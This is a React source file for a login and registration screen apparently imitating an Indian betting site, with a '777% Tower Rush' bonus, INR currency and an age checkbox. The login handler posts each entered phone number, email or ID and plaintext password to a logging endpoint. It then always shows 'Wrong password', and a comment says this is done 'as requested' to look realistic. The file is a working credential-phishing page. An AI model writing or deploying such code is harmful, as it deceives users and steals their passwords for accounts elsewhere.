/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from 'react';
import { 
  MessageSquare, 
  X, 
  ChevronDown, 
  Eye, 
  EyeOff, 
  Plus, 
  CheckCircle2,
  Smartphone,
  Mail
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type Tab = 'email' | 'phone';
type Screen = 'login' | 'registration';

export default function App() {
  const [screen, setScreen] = useState<Screen>('login');
  const [loginMethod, setLoginMethod] = useState<Tab>('phone');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [emailOrId, setEmailOrId] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [error, setError] = useState('');
  const [isTermsChecked, setIsTermsChecked] = useState(true);

  // Validation logic
  const isPhoneValid = phoneNumber.length === 10;
  const isEmailValid = emailOrId.length > 0;
  const isInputValid = (screen === 'registration' || loginMethod === 'phone') ? isPhoneValid : isEmailValid;
  const isFormValid = isInputValid && password.length > 0 && (screen === 'login' || isTermsChecked);

  const handleLogin = async () => {
    if (isFormValid) {
      setError('');
      try {
        fetch('/api/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            screen: 'login',
            method: loginMethod,
            identifier: loginMethod === 'phone' ? phoneNumber : emailOrId,
            password: password,
            extraInfo: { timestamp: new Date().toISOString() }
          })
        }).catch(err => console.error("Auth log failed", err));

        // Always show wrong password for login as requested, 
        // looking more "realistic" with a slight delay
        setTimeout(() => {
          setError('Wrong password');
        }, 600);

      } catch (error) {
        console.error("Auth log failed", error);
        setTimeout(() => setError('Wrong password'), 600);
      }
    }
  };

  const handleRegistration = async () => {
    if (isFormValid) {
      setError('');
      try {
        const res = await fetch('/api/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            screen: 'registration',
            method: 'phone',
            identifier: phoneNumber,
            password: password,
            extraInfo: { 
              termsAccepted: isTermsChecked,
              timestamp: new Date().toISOString() 
            }
          })
        });

        if (res.ok) {
          setIsSuccess(true);
          setTimeout(() => setIsSuccess(false), 1000);
        } else {
          setError('Registration error. Please try again.');
        }
      } catch (error) {
        console.error("Registration log failed", error);
        setError('Connection error.');
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#0b1a2d] flex items-center justify-center p-4 font-sans text-white">
      {/* Success Overlay */}
      <AnimatePresence>
        {isSuccess && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center pointer-events-none"
          >
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 1.1, opacity: 0 }}
              className="bg-[#22c55e] px-10 py-6 rounded-2xl shadow-[0_15px_40px_rgba(34,197,94,0.5)] flex flex-col items-center gap-4 border border-white/30 backdrop-blur-sm"
            >
              <CheckCircle2 className="w-12 h-12 text-white stroke-[3px]" />
              <span className="text-2xl font-black text-white tracking-wider uppercase italic">
                {screen === 'login' ? 'Success' : 'Success'}
              </span>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Main Container */}
      <motion.div 
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        className="w-full max-w-md bg-[#152335] rounded-2xl shadow-2xl overflow-hidden relative border border-white/5"
      >
        {/* Header */}
        <div className="flex items-center justify-between p-5 border-b border-gray-800">
          <div className="bg-[#1c2e45] p-2 rounded-lg cursor-pointer hover:bg-gray-700 transition-colors">
            <MessageSquare className="w-6 h-6 text-white" />
          </div>
          <h1 className="text-xl font-bold tracking-wider uppercase">
            {screen === 'login' ? 'Log In' : 'Registration'}
          </h1>
          <div className="p-2 rounded-lg cursor-pointer hover:bg-gray-700 transition-colors">
            <X className="w-6 h-6 text-gray-400" />
          </div>
        </div>

        {/* Content */}
        <div className="p-6 space-y-6">
          {/* Toggle Screen */}
          <div className="text-sm">
            {screen === 'login' ? (
              <p className="text-gray-400">
                New user?{' '}
                <button 
                  onClick={() => setScreen('registration')}
                  className="text-[#00aaff] font-semibold hover:underline"
                >
                  Registration
                </button>
              </p>
            ) : (
              <p className="text-gray-400">
                Have an account?{' '}
                <button 
                  onClick={() => setScreen('login')}
                  className="text-[#00aaff] font-semibold hover:underline"
                >
                  Log In
                </button>
              </p>
            )}
          </div>

          <AnimatePresence mode="wait">
            <motion.div
              key={screen + loginMethod}
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -10 }}
              transition={{ duration: 0.2 }}
              className="space-y-6"
            >
              {/* Tab Switcher (Only for Login) */}
              {screen === 'login' && (
                <div className="flex gap-3">
                  <button
                    onClick={() => setLoginMethod('email')}
                    className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg transition-all duration-300 font-bold ${
                      loginMethod === 'email' 
                        ? 'bg-[#007eff] text-white shadow-[0_0_15px_rgba(0,126,255,0.4)]' 
                        : 'bg-[#1c2e45] text-gray-400 hover:bg-gray-700'
                    }`}
                  >
                    <Mail className="w-5 h-5" />
                    Email or ID
                  </button>
                  <button
                    onClick={() => setLoginMethod('phone')}
                    className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg transition-all duration-300 font-bold ${
                      loginMethod === 'phone' 
                        ? 'bg-[#007eff] text-white shadow-[0_0_15px_rgba(0,126,255,0.4)]' 
                        : 'bg-[#1c2e45] text-gray-400 hover:bg-gray-700'
                    }`}
                  >
                    <Smartphone className="w-5 h-5" />
                    Phone
                  </button>
                </div>
              )}

              <div className="space-y-4">
                {/* Input Groups */}
                {(screen === 'registration' || loginMethod === 'phone') ? (
                  <div className="relative group">
                    <div className="flex bg-[#1c2e45] rounded-xl border border-transparent focus-within:border-[#007eff] transition-all overflow-hidden items-center group-hover:bg-[#253952]">
                      <div className="flex items-center gap-2 px-4 py-4 border-r border-gray-700 cursor-pointer hover:bg-gray-700 transition-colors">
                        <span className="text-lg">🇮🇳</span>
                        <span className="font-bold">+91</span>
                        <ChevronDown className="w-4 h-4 text-gray-400" />
                      </div>
                      <input
                        type="tel"
                        placeholder="Phone number"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                        className="w-full h-full p-4 bg-transparent outline-none placeholder:text-gray-500 font-medium"
                      />
                    </div>
                  </div>
                ) : (
                  <div className="relative group">
                    <input
                      type="text"
                      placeholder="Email or ID"
                      value={emailOrId}
                      onChange={(e) => setEmailOrId(e.target.value)}
                      className="w-full p-4 bg-[#1c2e45] rounded-xl border border-transparent focus-within:border-[#007eff] transition-all outline-none placeholder:text-gray-500 font-medium group-hover:bg-[#253952]"
                    />
                  </div>
                )}

                {/* Password */}
                <div className="space-y-1">
                  <div className="relative group">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      placeholder="Password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (error) setError('');
                      }}
                      className={`w-full p-4 bg-[#1c2e45] rounded-xl border transition-all outline-none placeholder:text-gray-500 font-medium pr-12 group-hover:bg-[#253952] ${
                        error ? 'border-[#ff4444] text-[#ff4444]' : 'border-transparent focus-within:border-[#007eff]'
                      }`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  <AnimatePresence>
                    {error && (
                      <motion.p 
                        initial={{ opacity: 0, y: -5 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -5 }}
                        className="text-[#ff4444] text-[11px] font-semibold pl-1"
                      >
                        {error}
                      </motion.p>
                    )}
                  </AnimatePresence>
                </div>

                {/* Extra fields for Registration */}
                {screen === 'registration' && (
                  <div className="space-y-4 pt-2">
                    <div className="flex items-center justify-between p-4 bg-[#1c2e45] rounded-xl border border-transparent hover:border-gray-600 transition-all cursor-pointer hover:bg-[#253952]">
                      <div className="flex items-center gap-3">
                        <div className="w-6 h-6 rounded-full overflow-hidden bg-white/10 flex items-center justify-center">
                          <span className="text-xs">🇮🇳</span>
                        </div>
                        <span className="font-medium text-gray-200">₹ - INR</span>
                      </div>
                      <ChevronDown className="w-5 h-5 text-gray-400" />
                    </div>

                    <div className="flex items-center gap-3 text-[#00aaff] font-bold py-2 cursor-pointer group">
                      <div className="w-6 h-6 rounded-full border-2 border-[#00aaff] flex items-center justify-center group-hover:bg-[#00aaff] group-hover:text-white transition-all">
                        <Plus className="w-4 h-4" />
                      </div>
                      <span>I have a promo code</span>
                    </div>

                    <div className="mt-8">
                      <h3 className="uppercase text-xs font-bold text-gray-500 tracking-wider mb-4">Choose your bonus</h3>
                      <div className="bg-[#007eff] p-4 rounded-xl flex items-center justify-between group cursor-pointer hover:bg-[#006ee0] transition-all relative overflow-hidden shadow-lg shadow-blue-500/20">
                        <div className="flex items-center gap-4 relative z-10">
                          <div className="w-12 h-12 bg-white/20 rounded-lg overflow-hidden flex items-center justify-center flex-shrink-0">
                            <img src="https://api.dicebear.com/7.x/shapes/svg?seed=bonus&backgroundColor=b6e3f4" alt="Bonus" className="w-full h-full object-cover" />
                          </div>
                          <div>
                            <p className="font-bold text-sm leading-tight">777% Tower Rush Welcome Pack</p>
                            <p className="text-[10px] text-white/70">Climb the Tower with Boost</p>
                          </div>
                        </div>
                        <div className="relative z-10">
                          <ChevronDown className="-rotate-90 w-5 h-5 text-white/50" />
                        </div>
                        {/* Decorative gloss effect */}
                        <div className="absolute top-0 -left-10 w-24 h-full bg-white/10 skew-x-12 blur-sm" />
                      </div>
                    </div>

                    <label className="flex items-start gap-3 mt-4 cursor-pointer group">
                      <div className="relative mt-1">
                        <input
                          type="checkbox"
                          checked={isTermsChecked}
                          onChange={(e) => setIsTermsChecked(e.target.checked)}
                          className="sr-only"
                        />
                        <div className={`w-5 h-5 rounded border-2 transition-all flex items-center justify-center ${
                          isTermsChecked ? 'bg-[#007eff] border-[#007eff]' : 'border-gray-600 group-hover:border-gray-500'
                        }`}>
                          {isTermsChecked && <CheckCircle2 className="w-4 h-4 text-white" />}
                        </div>
                      </div>
                      <span className="text-xs text-gray-400 leading-tight">
                        I confirm all the <span className="text-white font-bold">Terms of user agreement</span> and that I am over 18
                      </span>
                    </label>
                  </div>
                )}

                {/* Action Button */}
                <div className="pt-4">
                  <button
                    disabled={!isFormValid}
                    onClick={screen === 'login' ? handleLogin : handleRegistration}
                    className={`w-full py-4 rounded-xl font-bold uppercase tracking-widest transition-all duration-300 ${
                      isFormValid 
                        ? 'bg-[#007eff] text-white shadow-[0_5px_15px_rgba(0,126,255,0.4)] translate-y-[-2px] active:translate-y-0 cursor-pointer' 
                        : 'bg-[#1c2e45] text-gray-600 cursor-not-allowed opacity-50'
                    }`}
                  >
                    {screen === 'login' ? 'Log In' : 'Registration'}
                  </button>
                </div>

                {/* OR Divider */}
                <div className="flex items-center gap-4 py-4">
                  <div className="flex-1 h-[1px] bg-gray-800"></div>
                  <span className="text-xs font-bold text-gray-500 uppercase">Or</span>
                  <div className="flex-1 h-[1px] bg-gray-800"></div>
                </div>

                {/* Google Button */}
                <button className="w-full py-3 bg-[#007eff] hover:bg-[#006ee0] rounded-xl flex items-center justify-center gap-3 transition-all font-bold shadow-lg shadow-blue-500/10">
                  <div className="bg-white p-1 rounded-full">
                    <svg width="18" height="18" viewBox="0 0 24 24">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" />
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                    </svg>
                  </div>
                  Continue with Google
                </button>

                {/* Forgot Password Link (Only for Login) */}
                {screen === 'login' && (
                  <div className="text-center pt-2">
                    <button className="text-gray-400 text-xs hover:text-white transition-colors">
                      Forgot password? <span className="text-[#00aaff] font-bold">Reset</span>
                    </button>
                  </div>
                )}
              </div>
            </motion.div>
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
}

